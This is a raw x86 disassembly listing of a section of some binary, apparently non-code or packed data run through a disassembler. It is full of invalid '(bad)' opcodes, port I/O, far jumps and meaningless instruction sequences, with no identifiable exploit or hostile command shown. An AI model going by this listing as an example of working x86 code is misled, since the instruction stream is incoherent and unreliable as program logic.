  40b1f2:	jns    0x40b1e5
  40b1f4:	sub    al,0x16
  40b1f6:	lea    edx,[ecx]
  40b1f8:	mov    ah,0xaa
  40b1fa:	loope  0x40b257
  40b1fc:	add    al,0xff
  40b1fe:	mov    dl,0x84
  40b200:	rcr    BYTE PTR [edx-0x2fa61f9b],1
  40b206:	gs loope 0x40b24b
  40b209:	lahf   
  40b20a:	outs   dx,DWORD PTR ds:[esi]
  40b20b:	neg    DWORD PTR [edi-0x31]
  40b20e:	jno    0x40b265
  40b210:	and    cl,bl
  40b212:	dec    esi
  40b213:	sub    al,0xa6
  40b215:	fisttp DWORD PTR ds:[eax-0x78f45fc1]
  40b21c:	pushf  
  40b21d:	data16 mov al,0x5e
  40b220:	jne    0x40b1f3
  40b222:	scas   al,BYTE PTR es:[edi]
  40b223:	mov    ds:0x64de336f,al
  40b228:	int    0x3b
  40b22a:	ret    
  40b22b:	jmp    0xdd5d:0xa1187c8d
  40b232:	inc    eax
  40b233:	(bad)  
  40b234:	popa   
  40b235:	out    dx,eax
  40b236:	ret    
  40b237:	mov    dh,0x1
  40b239:	xchg   ebx,eax
  40b23a:	inc    ebp
  40b23b:	int    0x83
  40b23d:	pop    esi
  40b23e:	iret   
  40b23f:	xchg   DWORD PTR [edx],eax
  40b241:	bound  esi,QWORD PTR [edi-0x28]
  40b244:	aad    0xc0
  40b246:	lahf   
  40b247:	sbb    al,0xd7
  40b249:	fist   DWORD PTR [edx+0x2b]
  40b24c:	push   ss
  40b24d:	or     al,0x40
  40b24f:	test   eax,0x87595dc7
  40b254:	neg    al
  40b256:	pusha  
  40b257:	jg     0x40b277
  40b259:	push   eax
  40b25a:	mov    ah,0xce
  40b25c:	ins    BYTE PTR es:[edi],dx
  40b25d:	pop    edx
  40b25e:	loop   0x40b1ed
  40b260:	push   es
  40b261:	xor    esp,DWORD PTR [edx]
  40b263:	xchg   ebp,eax
  40b264:	xchg   cl,dl
  40b266:	jge    0x40b1f2
  40b268:	mov    al,0x25
  40b26a:	dec    esp
  40b26b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b26c:	inc    eax
  40b26d:	icebp  
  40b26e:	jae    0x40b2a3
  40b270:	jecxz  0x40b276
  40b272:	sub    bl,bl
  40b274:	sbb    ebp,ecx
  40b276:	into   
  40b277:	or     ebx,DWORD PTR [edi-0x29d08415]
  40b27d:	fdiv   DWORD PTR [edx]
  40b27f:	sbb    edi,DWORD PTR [edx]
  40b281:	popa   
  40b282:	out    dx,al
  40b283:	and    DWORD PTR [ebp+edi*2-0x16],esi
  40b287:	push   0x5d07f540
  40b28c:	pop    edx
  40b28d:	in     eax,dx
  40b28e:	pop    eax
  40b28f:	leave  
  40b290:	jp     0x40b255
  40b292:	test   DWORD PTR [esi],eax
  40b294:	xor    DWORD PTR ds:0x20583880,eax
  40b29a:	es xor al,0xcf
  40b29d:	dec    bh
  40b29f:	and    ch,BYTE PTR [edi]
  40b2a1:	test   BYTE PTR [ecx-0x75],bl
  40b2a4:	fcomp  st(6)
  40b2a6:	xor    bh,BYTE PTR [eax-0x645082ba]
  40b2ac:	std    
  40b2ad:	xlat   BYTE PTR ds:[ebx]
  40b2ae:	js     0x40b240
  40b2b0:	fistp  QWORD PTR [edx+eiz*4]
  40b2b3:	pop    edi
  40b2b4:	mov    ch,0xb7
  40b2b6:	pop    edi
  40b2b7:	cdq    
  40b2b8:	stos   DWORD PTR es:[edi],eax
  40b2b9:	pushf  
  40b2ba:	push   ebp
  40b2bb:	leave  
  40b2bc:	pop    ds
  40b2bd:	mov    ah,0x1a
  40b2bf:	shl    BYTE PTR [edx+0x29],cl
  40b2c2:	add    ebp,DWORD PTR [edi-0x74]
  40b2c5:	push   ebp
  40b2c6:	or     ecx,ebx
  40b2c8:	mov    edx,0xd35df21a
  40b2cd:	xchg   ebx,eax
  40b2ce:	push   es
  40b2cf:	inc    edx
  40b2d0:	jmp    0xc0e2348b
  40b2d5:	imul   esi,DWORD PTR [edi-0x32],0xffffffe9
  40b2d9:	dec    edi
  40b2da:	stos   DWORD PTR es:[di],eax
  40b2dc:	sbb    DWORD PTR [edi+0x67538003],0x600d3b1
  40b2e6:	jmp    0x40b308
  40b2e8:	xor    BYTE PTR [ecx-0x3d],dl
  40b2eb:	ins    DWORD PTR es:[edi],dx
  40b2ec:	add    al,0xc2
  40b2ee:	xchg   ecx,eax
  40b2ef:	pop    es
  40b2f0:	repz rol DWORD PTR [ecx],0xa3
  40b2f4:	dec    edi
  40b2f5:	dec    edx
  40b2f6:	mov    WORD PTR [edi+0x611c1f52],cs
  40b2fc:	jno    0x40b303
  40b2fe:	push   esi
  40b2ff:	mov    ebx,0x109b10ce
  40b304:	xchg   ecx,eax
  40b305:	sub    eax,edi
  40b307:	dec    edi
  40b308:	push   ds
  40b309:	repnz mov dl,BYTE PTR es:[edi+ecx*8+0x7]
  40b30f:	outs   dx,DWORD PTR ds:[esi]
  40b310:	shl    al,0xca
  40b313:	popf   
  40b314:	adc    cl,BYTE PTR [ebp+0x3b]
  40b317:	stos   BYTE PTR es:[edi],al
  40b318:	in     eax,0x3f
  40b31a:	in     eax,dx
  40b31b:	aas    
  40b31c:	cmp    eax,edi
  40b31e:	add    dl,BYTE PTR [edi-0x39acefcd]
  40b324:	mov    dh,0xf2
  40b326:	dec    esi
  40b327:	jmp    0xe73047de
  40b32c:	mov    dh,BYTE PTR [ecx+esi*4]
  40b32f:	or     eax,DWORD PTR [ecx-0x5840dd50]
  40b335:	inc    ebx
  40b336:	mov    eax,0x51da065d
  40b33b:	cld    
  40b33c:	(bad)  
  40b33d:	xor    eax,0x563797cb
  40b342:	iret   
  40b343:	pop    edi
  40b344:	xchg   ebp,eax
  40b345:	xchg   esp,eax
  40b346:	or     al,0x5c
  40b348:	mov    al,ds:0x4ee5c5b6
  40b34d:	cwde   
  40b34e:	xor    DWORD PTR [edx+0x582f576],edx
  40b354:	(bad)  
  40b356:	data16 jl 0x40b34d
  40b359:	popf   
  40b35a:	dec    esi
  40b35b:	mov    ecx,DWORD PTR [esi+0xaea524f]
  40b361:	fisub  WORD PTR [esi]
  40b363:	pop    ebx
  40b364:	in     eax,0x32
  40b366:	push   edx
  40b367:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b368:	cdq    
  40b369:	test   DWORD PTR [ecx+0x66],edx
  40b36c:	xor    DWORD PTR [ebx+0x4c],edx
  40b36f:	jnp    0x40b339
  40b371:	inc    edi
  40b372:	mov    bl,0xf5
  40b374:	add    eax,eax
  40b376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b377:	add    ebp,edx
  40b379:	loopne 0x40b39d
  40b37b:	adc    dh,dl
  40b37d:	cmp    BYTE PTR [edx],ch
  40b37f:	mov    edi,0x29bf1d22
  40b384:	out    dx,eax
  40b385:	inc    esp
  40b386:	pushf  
  40b387:	(bad)  
  40b388:	mov    ds:0xf6918d48,eax
  40b38d:	mov    gs,WORD PTR [ebx+0x37]
  40b390:	lods   eax,DWORD PTR ds:[esi]
  40b391:	inc    esi
  40b392:	sub    dl,bh
  40b394:	sub    bh,BYTE PTR ss:[edx-0x505d7b47]
  40b39b:	jno    0x40b32e
  40b39d:	or     DWORD PTR [eax],ecx
  40b39f:	rol    BYTE PTR [eax+0x39a5f75a],0xbe
  40b3a6:	push   esi
  40b3a7:	(bad)  
  40b3aa:	push   ebp
  40b3ab:	sub    cl,BYTE PTR [esi+0x74]
  40b3ae:	std    
  40b3af:	test   eax,0x99d3ddbf
  40b3b4:	ja     0x40b419
  40b3b6:	xchg   esp,eax
  40b3b7:	add    edx,DWORD PTR [ecx-0x11]
  40b3ba:	retf   
  40b3bb:	jo     0x40b3b1
  40b3bd:	push   ecx
  40b3be:	mov    al,0x68
  40b3c0:	ret    
  40b3c1:	lods   eax,DWORD PTR ds:[esi]
  40b3c2:	cld    
  40b3c3:	jp     0x40b3d4
  40b3c5:	add    DWORD PTR [edx+0x63ce66c2],edi
  40b3cb:	(bad)  [esi]
  40b3cd:	and    dh,BYTE PTR [edx+0x45]
  40b3d0:	add    bh,BYTE PTR [eax]
  40b3d2:	adc    dl,0x78
  40b3d5:	add    DWORD PTR [esi],esp
  40b3d7:	dec    esp
  40b3d8:	fldenv [esi]
  40b3da:	test   eax,0x4782ff7e
  40b3df:	add    cl,BYTE PTR [ebp+0x5c]
  40b3e2:	(bad)  ds:0x8381f136
  40b3e8:	mov    edi,DWORD PTR [edi]
  40b3ea:	loop   0x40b3c0
  40b3ec:	(bad)  
  40b3ed:	jmp    0x40b437
  40b3ef:	jge    0x40b3a1
  40b3f1:	test   BYTE PTR ds:0xf57c1e0e,dh
  40b3f7:	xlat   BYTE PTR ds:[ebx]
  40b3f8:	cs xchg ebx,eax
  40b3fa:	push   edx
  40b3fb:	lods   eax,DWORD PTR ds:[esi]
  40b3fc:	lock push ebx
  40b3fe:	xchg   esi,eax
  40b3ff:	cs cli 
  40b401:	icebp  
  40b402:	xchg   edi,eax
  40b403:	nop
  40b404:	lock inc ebp
  40b406:	jns    0x40b44f
  40b408:	jmp    0x9336:0x12f22a4e
  40b40f:	add    bh,BYTE PTR [ebx]
  40b411:	adc    BYTE PTR [ecx+0x24],bh
  40b414:	in     eax,0xaf
  40b416:	jecxz  0x40b411
  40b418:	and    BYTE PTR [edi+edx*8-0x1f],bl
  40b41c:	loopne 0x40b474
  40b41e:	jo     0x40b445
  40b420:	cmp    BYTE PTR [ebp-0x3],bl
  40b423:	sub    eax,edx
  40b425:	push   ebx
  40b426:	xchg   DWORD PTR [ebx-0x276ff79e],esp
  40b42c:	cmp    al,0x4c
  40b42e:	enter  0x5a81,0x4d
  40b432:	sbb    dl,BYTE PTR [edi+0x1e0ef6c6]
  40b438:	(bad)  
  40b439:	pop    esp
  40b43a:	shl    DWORD PTR [edi-0x7e97f887],0x8
  40b441:	jae    0x40b3eb
  40b443:	sbb    ecx,DWORD PTR [eax-0x22]
  40b446:	cmp    eax,0x96c3b962
  40b44b:	or     esi,edx
  40b44d:	jae    0x40b450
  40b44f:	cmp    edx,ebp
  40b451:	and    cl,BYTE PTR [esi-0x221a2010]
  40b457:	repz fnstenv [ebx+0x3]
  40b45b:	(bad)  
  40b45c:	fs mov ebp,0xb97d17b9
  40b462:	icebp  
  40b463:	fs lock leave 
  40b466:	pushf  
  40b467:	jb     0x40b4c3
  40b469:	jmp    0x40b41a
  40b46b:	pop    ebp
  40b46c:	fidiv  WORD PTR [ecx+0xa54186b]
  40b472:	xchg   ebp,eax
  40b473:	push   esp
  40b474:	fcmovnu st,st(1)
  40b476:	jne    0x40b4dc
  40b478:	inc    esp
  40b479:	(bad)  
  40b47b:	jecxz  0x40b499
  40b47d:	xchg   edx,eax
  40b47e:	(bad)  
  40b47f:	pop    esi
  40b480:	jmp    0x2d48a00d
  40b485:	retf   
  40b486:	addr16 mov al,0x12
  40b489:	jge    0x40b479
  40b48b:	addr16 dec edi
  40b48d:	adc    BYTE PTR [eax],0x3a
  40b490:	nop
  40b491:	mov    eax,ds:0xdabe4e3a
  40b496:	in     al,dx
  40b497:	(bad)  
  40b499:	add    dh,cl
  40b49b:	rcr    bh,1
  40b49d:	je     0x40b493
  40b49f:	jp     0x40b4ab
  40b4a1:	mov    cl,0xa2
  40b4a3:	out    0x87,al
  40b4a5:	jae    0x40b454
  40b4a7:	push   ebp
  40b4a8:	xchg   ebx,eax
  40b4a9:	jbe    0x40b4e5
  40b4ab:	fs loope 0x40b483
  40b4ae:	test   al,0x6f
  40b4b0:	mov    dl,0xd8
  40b4b2:	pop    ds
  40b4b3:	outs   dx,DWORD PTR ds:[esi]
  40b4b4:	fistp  WORD PTR [ecx+edi*1]
  40b4b8:	add    ah,bl
  40b4ba:	addr16 or al,0xa8
  40b4bd:	imul   ebp,DWORD PTR [eax-0x3ec04df1],0x16b5d7f4
  40b4c7:	jle    0x40b4cf
  40b4c9:	mov    cl,0x10
  40b4cb:	mov    fs,WORD PTR [ecx-0x76292817]
  40b4d1:	mov    cl,0x3c
  40b4d3:	aas    
  40b4d4:	sbb    BYTE PTR [edi+edi*4],bh
  40b4d7:	(bad)  
  40b4d9:	fwait
  40b4da:	shl    BYTE PTR [ebx-0x756fec44],0x74
  40b4e1:	mov    bl,0x1b
  40b4e3:	scas   eax,DWORD PTR es:[edi]
  40b4e4:	fwait
  40b4e5:	lea    ebx,[edi-0x1f5df3e0]
  40b4eb:	rcl    bh,0x56
  40b4ee:	inc    edi
  40b4ef:	jl     0x40b483
  40b4f1:	aam    0xbe
  40b4f3:	shl    BYTE PTR [eax+0x2ddde427],cl
  40b4f9:	sahf   
  40b4fa:	lahf   
  40b4fb:	mov    DWORD PTR [esi],ecx
  40b4fd:	aaa    
  40b4fe:	adc    BYTE PTR [esi+eiz*2+0x6a383704],bh
  40b505:	xlat   BYTE PTR ds:[ebx]
  40b506:	pop    esi
  40b507:	xor    eax,0x63eb1b9
  40b50c:	cs mov edi,0x7d65489
  40b512:	dec    esi
  40b513:	xor    al,0xf5
  40b515:	push   esp
  40b516:	inc    esi
  40b517:	sbb    BYTE PTR [eax+0x31],dh
  40b51a:	mov    DWORD PTR [eax+0xc5608c1],0x9c3dbb8c
  40b524:	or     eax,0x19ea5951
  40b529:	sub    BYTE PTR [esi-0x6a9f4176],dh
  40b52f:	mov    ds:0xc931aac8,al
  40b534:	lds    esp,FWORD PTR [esi+0x2d1519a0]
  40b53a:	std    
  40b53b:	cdq    
  40b53c:	xchg   BYTE PTR [ebx-0x37],bh
  40b53f:	dec    eax
  40b540:	jo     0x40b58c
  40b542:	ror    DWORD PTR [esi+0x3b616ee],cl
  40b548:	int3   
  40b549:	push   0x47
  40b54b:	mov    cl,0x50
  40b54d:	neg    ecx
  40b54f:	xchg   ebx,eax
  40b550:	adc    BYTE PTR [ebp+0x18],dh
  40b553:	push   esp
  40b554:	inc    esp
  40b555:	inc    ebp
  40b556:	push   ecx
  40b557:	out    0xe8,al
  40b559:	(bad)  
  40b55a:	xchg   esp,eax
  40b55b:	call   0x3e62:0x92a633c3
  40b562:	add    BYTE PTR [ebx-0x46],bh
  40b565:	push   es
  40b566:	shl    BYTE PTR [ecx+0x6a],cl
  40b569:	add    al,0xb7
  40b56b:	ja     0x40b579
  40b56d:	in     al,dx
  40b56e:	mov    esp,0xe6ad2ec7
  40b573:	push   ecx
  40b574:	inc    DWORD PTR [ecx]
  40b576:	jnp    0x40b507
  40b578:	mov    BYTE PTR [edx-0xf],dl
  40b57b:	rcr    DWORD PTR [edi-0x2f],cl
  40b57e:	(bad)  
  40b57f:	not    BYTE PTR [ecx-0x5c]
  40b582:	add    BYTE PTR [edi],cl
  40b584:	push   esp
  40b585:	mov    ah,al
  40b587:	int    0x9
  40b589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b58a:	leave  
  40b58b:	inc    ebx
  40b58c:	in     eax,dx
  40b58d:	jnp    0x40b518
  40b58f:	jno    0x40b535
  40b591:	out    0x8f,eax
  40b593:	call   0xa704:0x660066f7
  40b59a:	repz sub eax,0xeafab803
  40b5a0:	(bad)  
  40b5a1:	imul   edi,DWORD PTR [edi],0x9284fab5
  40b5a7:	inc    esi
  40b5a8:	xor    al,0xe7
  40b5aa:	adc    al,0x1
  40b5ac:	scas   eax,DWORD PTR es:[edi]
  40b5ad:	mov    esp,0x75393cbf
  40b5b2:	and    ecx,DWORD PTR [esi-0x4f9c8af7]
  40b5b8:	mov    ebp,0xe313a626
  40b5bd:	sbb    esp,DWORD PTR [eax+esi*4]
  40b5c0:	iret   
  40b5c1:	fbld   TBYTE PTR ss:0x4d25711c
  40b5c8:	loop   0x40b585
  40b5ca:	sub    ah,BYTE PTR [edx-0x18]
  40b5cd:	cdq    
  40b5ce:	jnp    0x40b55e
  40b5d0:	imul   eax,DWORD PTR [ebp-0x16a2c574],0x7f953c16
  40b5da:	in     al,0x5e
  40b5dc:	mov    esi,0x79ce5657
  40b5e1:	mov    WORD PTR [edi+0x16],fs
  40b5e4:	shl    BYTE PTR [edi-0x20ca30ca],cl
  40b5ea:	jp     0x40b666
  40b5ec:	xchg   edi,eax
  40b5ed:	adc    eax,0xa28445b2
  40b5f2:	push   cs
  40b5f3:	mov    ebx,0x7fc6ef74
  40b5f8:	out    0xb1,al
  40b5fa:	sbb    edi,0xffffffbb
  40b5fd:	lock sti 
  40b5ff:	pop    edx
  40b600:	sbb    al,0x1c
  40b602:	ins    BYTE PTR es:[edi],dx
  40b603:	sub    dl,ah
  40b605:	sbb    al,0xda
  40b607:	outs   dx,BYTE PTR ds:[esi]
  40b608:	lods   al,BYTE PTR ds:[esi]
  40b609:	pop    ss
  40b60a:	lds    esi,FWORD PTR [eax]
  40b60c:	inc    cl
  40b60e:	lds    ebx,FWORD PTR [esi-0x11238687]
  40b614:	push   es
  40b615:	cwde   
  40b616:	test   eax,0xb07df071
  40b61b:	sbb    BYTE PTR [edi-0x3e81d84e],cl
  40b621:	test   eax,0xdcc1fac
  40b627:	xchg   edi,eax
  40b628:	cmp    eax,0xd8c91965
  40b62d:	push   0xc8d63fa7
  40b632:	dec    eax
  40b633:	mov    bh,BYTE PTR [esi]
  40b635:	stc    
  40b636:	jns    0x40b669
  40b638:	ins    BYTE PTR es:[edi],dx
  40b639:	jmp    0x31f5:0x24146f49
  40b640:	sahf   
  40b641:	sub    ebx,esi
  40b643:	cmp    DWORD PTR [ebx],esp
  40b645:	mov    dl,0x68
  40b647:	das    
  40b648:	repnz shl eax,cl
  40b64b:	adc    eax,0x4dbc7b06
  40b650:	iret   
  40b651:	call   0xe54db08c
  40b656:	int    0x19
  40b658:	xchg   ebp,eax
  40b659:	add    edi,DWORD PTR [eax+0x4fcbee52]
  40b65f:	inc    edx
  40b660:	shr    DWORD PTR [edi+0x2879e37b],0x21
  40b667:	int    0x46
  40b669:	mov    esp,0x211b95ed
  40b66e:	sbb    eax,0xe1d52a5b
  40b673:	and    eax,DWORD PTR gs:[edi-0x6d]
  40b677:	push   ebx
  40b678:	dec    eax
  40b679:	sub    ebx,eax
  40b67b:	and    eax,0x60faea07
  40b680:	(bad)  
  40b681:	sub    BYTE PTR [ebx+eiz*8-0x10],dl
  40b685:	test   DWORD PTR [esi+0x42],eax
  40b688:	ins    DWORD PTR es:[edi],dx
  40b689:	or     ch,BYTE PTR [ecx-0x6a9cb12a]
  40b68f:	adc    ecx,eax
  40b691:	add    eax,0x2b6aa905
  40b696:	jecxz  0x40b64f
  40b698:	in     al,0xe7
  40b69a:	mov    bh,0xb4
  40b69c:	push   edx
  40b69d:	in     al,0x6a
  40b69f:	dec    ecx
  40b6a0:	fcom   DWORD PTR [ecx+0x22]
  40b6a3:	or     BYTE PTR [esi],dl
  40b6a5:	jbe    0x40b62e
  40b6a7:	cmp    al,dh
  40b6a9:	lods   eax,DWORD PTR ds:[esi]
  40b6aa:	push   0x1e
  40b6ac:	fild   WORD PTR [edx+0x5b]
  40b6af:	jmp    0x40b713
  40b6b1:	stos   BYTE PTR es:[edi],al
  40b6b2:	(bad)  
  40b6b3:	cwde   
  40b6b4:	popa   
  40b6b5:	adc    DWORD PTR [esi-0x61],esp
  40b6b8:	jbe    0x40b6e5
  40b6ba:	push   ds
  40b6bb:	dec    edx
  40b6bc:	rol    bl,1
  40b6be:	sti    
  40b6bf:	repz popa 
  40b6c1:	mov    esi,0xb41c9f94
  40b6c6:	(bad)  
  40b6c8:	cmp    eax,0x5fda50d1
  40b6cd:	aas    
  40b6ce:	sbb    eax,DWORD PTR [ebx+0x5cd85490]
  40b6d4:	inc    edx
  40b6d5:	out    dx,eax
  40b6d6:	cmp    ebx,DWORD PTR [ebx+0xe166577]
  40b6dc:	cmp    al,0x7b
  40b6de:	sub    al,0x9a
  40b6e0:	xlat   BYTE PTR ds:[ebx]
  40b6e1:	sbb    BYTE PTR [edi+0x53],dh
  40b6e4:	fcmovb st,st(7)
  40b6e6:	jmp    0x484cdfe2
  40b6eb:	xchg   ebp,eax
  40b6ec:	movups XMMWORD PTR [eax],xmm6
  40b6ef:	aam    0xf7
  40b6f1:	cmp    DWORD PTR [ebx+0x2149986],edi
  40b6f7:	add    edi,DWORD PTR [ebp-0x2e]
  40b6fa:	std    
  40b6fb:	mov    ds:0xc6427753,eax
  40b700:	imul   BYTE PTR [ecx]
  40b702:	shl    BYTE PTR [esi+0x15b49631],1
  40b708:	mov    ah,0x1e
  40b70a:	sub    ch,BYTE PTR [esi-0xf90aa4d]
  40b710:	int    0x46
  40b712:	fs (bad) 
  40b714:	jb     0x40b78c
  40b716:	ror    DWORD PTR [edi+0x3d6c8d2b],1
  40b71c:	popf   
  40b71d:	mov    ds:0x6b30e00b,al
  40b722:	push   es
  40b723:	jne    0x40b6c6
  40b725:	sbb    BYTE PTR [edx+0x3b078c2],ch
  40b72b:	ret    0xe236
  40b72e:	and    dl,BYTE PTR [esi-0xf]
  40b731:	push   ecx
  40b732:	adc    dl,BYTE PTR [ebp+edx*1-0x28]
  40b736:	pop    esi
  40b737:	inc    ecx
  40b738:	lahf   
  40b739:	cwde   
  40b73a:	jl     0x40b791
  40b73c:	cld    
  40b73d:	jl     0x40b705
  40b73f:	sub    ch,BYTE PTR [edi-0x7e]
  40b742:	inc    ebp
  40b743:	add    BYTE PTR [eax-0x4544e5d7],bl
  40b749:	mov    al,ds:0x65f8b574
  40b74e:	pushf  
  40b74f:	popf   
  40b750:	mov    esi,0x9f7411d3
  40b755:	add    ebx,DWORD PTR [esi+0xd70dbd7]
  40b75b:	cmp    BYTE PTR [ecx-0x49],0x7c
  40b75f:	add    dh,ch
  40b761:	aad    0xf8
  40b763:	jmp    DWORD PTR [ecx+0x1b]
  40b766:	inc    esp
  40b767:	sbb    al,0x68
  40b769:	bound  ebx,QWORD PTR [ecx+0xc62aa42]
  40b76f:	enter  0x3e4c,0xb7
  40b773:	imul   ebx,DWORD PTR [esi+0x38],0xc4bc64ca
  40b77a:	or     eax,0x42aa7d79
  40b77f:	xlat   BYTE PTR ds:[ebx]
  40b780:	imul   ebx,esp,0x5c23ed8c
  40b786:	test   al,0x75
  40b788:	aas    
  40b789:	jmp    0x40b7c6
  40b78b:	and    DWORD PTR [ebx+0x4e],0xd2549f8c
  40b792:	retf   0xbfa7
  40b795:	popa   
  40b796:	or     al,0xa2
  40b798:	les    eax,FWORD PTR [ebp-0x173f1a4e]
  40b79e:	divps  xmm4,XMMWORD PTR [ebp+0x7473fba3]
  40b7a5:	xchg   DWORD PTR [ebp+0x1a86d68c],esi
  40b7ab:	xchg   ebx,eax
  40b7ac:	push   esp
  40b7ad:	mov    eax,ds:0xc0f1f4aa
  40b7b2:	scas   al,BYTE PTR es:[edi]
  40b7b3:	pop    ecx
  40b7b4:	push   0x2b078a0a
  40b7b9:	inc    edx
  40b7ba:	into   
  40b7bb:	sub    eax,0xe30e105c
  40b7c0:	add    ebx,edx
  40b7c2:	lds    ecx,FWORD PTR [edi-0x243e9bc]
  40b7c8:	cli    
  40b7c9:	mov    dh,0xc6
  40b7cb:	bound  ebp,QWORD PTR [edx+0x2421191d]
  40b7d1:	popf   
  40b7d2:	mov    WORD PTR [eax+0x71],ss
  40b7d5:	hlt    
  40b7d6:	dec    eax
  40b7d7:	call   0xf182b822
  40b7dc:	add    edx,esp
  40b7de:	nop
  40b7df:	xor    al,0xae
  40b7e1:	lahf   
  40b7e2:	add    al,0x89
  40b7e4:	sub    edi,ebp
  40b7e6:	test   al,0xa3
  40b7e8:	jbe    0x40b7bb
  40b7ea:	inc    esi
  40b7eb:	(bad)  
  40b7ec:	call   0x59a53c92
  40b7f1:	xor    BYTE PTR [ecx+0xacedc77],dl
  40b7f7:	call   0xe07c9ed0
  40b7fc:	hlt    
  40b7fd:	sbb    ch,BYTE PTR [edx]
  40b7ff:	add    DWORD PTR [edx],eax
  40b801:	jle    0x40b859
  40b803:	sub    BYTE PTR [ebx+0x69],dh
  40b806:	mov    ds:0xd5928c4c,eax
  40b80b:	ret    
  40b80c:	adc    edx,DWORD PTR [esi-0x1ae683fa]
  40b812:	cmp    DWORD PTR [edx-0x65],0x6a
  40b816:	call   0xf5:0x6b282d4b
  40b81d:	in     al,dx
  40b81e:	sub    bh,BYTE PTR [esi+0x7b8472e7]
  40b824:	or     dh,BYTE PTR [edx+0x3]
  40b827:	pop    es
  40b828:	mov    DWORD PTR [esi-0x2f],ebx
  40b82b:	js     0x40b8a7
  40b82d:	or     al,0xb8
  40b82f:	or     esp,ecx
  40b831:	pop    esi
  40b832:	leave  
  40b833:	out    0x2a,eax
  40b835:	arpl   bp,sp
  40b837:	dec    esp
  40b838:	push   esi
  40b839:	sbb    al,0x1d
  40b83b:	jae    0x40b879
  40b83d:	dec    ecx
  40b83e:	jmp    0x40b840
  40b840:	adc    BYTE PTR [edx],cl
  40b842:	cmp    ecx,DWORD PTR [ebx]
  40b844:	mov    ecx,0x84172275
  40b849:	inc    BYTE PTR [esi]
  40b84b:	pushf  
  40b84c:	(bad)  [edi+0x3925e1f0]
  40b852:	enter  0xa4d1,0x91
  40b856:	rdpmc  
  40b858:	or     cl,dl
  40b85a:	cld    
  40b85b:	sbb    dh,BYTE PTR [edi-0x6c]
  40b85e:	stos   BYTE PTR es:[edi],al
  40b85f:	xchg   edx,eax
  40b860:	xchg   ecx,eax
  40b861:	jnp    0x40b828
  40b863:	mov    esi,0xa907c114
  40b868:	cs dec ebx
  40b86a:	mov    DWORD PTR [esi+0x4160db21],ebx
  40b870:	pop    edi
  40b871:	sar    BYTE PTR [ebx+0x1ec33865],0x7c
  40b878:	gs or  dh,bh
  40b87b:	dec    ecx
  40b87c:	and    ecx,DWORD PTR [eax-0x7b]
  40b87f:	loop   0x40b8bb
  40b881:	mov    ecx,es
  40b883:	sub    al,0x98
  40b885:	and    eax,0x7e042840
  40b88a:	adc    BYTE PTR [edx],0x5
  40b88d:	inc    esp
  40b88e:	mov    dh,0xde
  40b890:	test   eax,0x1ec525f4
  40b895:	or     DWORD PTR [edi],0x3d
  40b898:	or     eax,0xb7ad326e
  40b89d:	data16 js 0x40b8ed
  40b8a0:	jp     0x40b851
  40b8a2:	(bad)  [esi+0x20]
  40b8a5:	mov    ecx,0x977ffa82
  40b8aa:	add    bl,al
  40b8ac:	into   
  40b8ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8ae:	xor    ebx,edx
  40b8b0:	dec    edi
  40b8b1:	pop    eax
  40b8b2:	cli    
  40b8b3:	pusha  
  40b8b4:	add    eax,0x56c176c2
  40b8b9:	xchg   BYTE PTR [ecx+ebp*1],bh
  40b8bc:	fst    QWORD PTR [ebx-0x3744a5a3]
  40b8c2:	pop    ss
  40b8c3:	inc    ebx
  40b8c4:	cmp    al,0xde
  40b8c6:	mov    ebp,0xd04ab5a2
  40b8cb:	mov    esi,0x2e154d62
  40b8d0:	cmc    
  40b8d1:	aaa    
  40b8d2:	addr16 inc edx
  40b8d4:	fcom   QWORD PTR [eax]
  40b8d6:	(bad)  
  40b8d7:	js     0x40b86f
  40b8d9:	adc    bh,0x66
  40b8dc:	retf   
  40b8dd:	push   ss
  40b8de:	cwde   
  40b8df:	popa   
  40b8e0:	sbb    ebx,esp
  40b8e2:	shr    ah,cl
  40b8e4:	jno    0x40b939
  40b8e6:	push   edx
  40b8e7:	lods   eax,DWORD PTR ds:[esi]
  40b8e8:	mov    dl,BYTE PTR [ebp-0x51]
  40b8eb:	xchg   esi,eax
  40b8ec:	push   cs
  40b8ed:	(bad)  
  40b8ef:	jnp    0x40b8fd
  40b8f1:	dec    edi
  40b8f2:	cdq    
  40b8f3:	iret   
  40b8f4:	popa   
  40b8f5:	push   edx
  40b8f6:	cmp    eax,0xf23d99a4
  40b8fb:	rcr    BYTE PTR [edi-0x3c],cl
  40b8fe:	dec    ebx
  40b8ff:	pop    es
  40b900:	iret   
  40b901:	das    
  40b902:	pop    ss
  40b903:	jnp    0x40b92b
  40b905:	(bad)  
  40b906:	mov    WORD PTR [edi+0x16],fs
  40b909:	or     BYTE PTR [eax-0x2eff863],ah
  40b90f:	mov    bh,0x50
  40b911:	jno    0x40b8ad
  40b913:	pop    edi
  40b914:	inc    edx
  40b915:	in     eax,0x5e
  40b917:	ja     0x40b8f6
  40b919:	nop
  40b91a:	(bad)  
  40b91b:	cmp    BYTE PTR ds:0xb4e4528b,bh
  40b921:	fstp   DWORD PTR [eax+0x26]
  40b924:	and    eax,0x349aab67
  40b929:	ret    
  40b92a:	add    BYTE PTR [esi],bh
  40b92c:	inc    esi
  40b92d:	jae    0x40b90c
  40b92f:	jg     0x40b8c5
  40b931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b932:	cmp    edi,DWORD PTR [ecx+0x18]
  40b935:	push   ds
  40b936:	pop    esi
  40b937:	cs push eax
  40b939:	test   eax,0x75891b13
  40b93e:	pop    edx
  40b93f:	mov    ds:0xf9793515,eax
  40b944:	pop    esp
  40b945:	and    BYTE PTR cs:[ecx-0x73],al
  40b949:	neg    DWORD PTR [ecx]
  40b94b:	adc    eax,DWORD PTR [ebp+0x5]
  40b94e:	adc    eax,0x7c1211cd
  40b953:	xchg   esp,eax
  40b954:	cli    
  40b955:	inc    ebx
  40b956:	mov    dl,0x23
  40b958:	jge    0x40b9ac
  40b95a:	xor    eax,0x84590d19
  40b95f:	jecxz  0x40b9cb
  40b961:	(bad)
  40b965:	arpl   WORD PTR [edx],dx
  40b967:	xor    eax,DWORD PTR [ecx+eiz*4-0x2a]
  40b96b:	retf   0x4cfc
  40b96e:	pop    edx
  40b96f:	mov    ah,0x36
  40b971:	ret    
  40b972:	test   cl,ah
  40b974:	lods   al,BYTE PTR es:[esi]
  40b976:	rol    dh,1
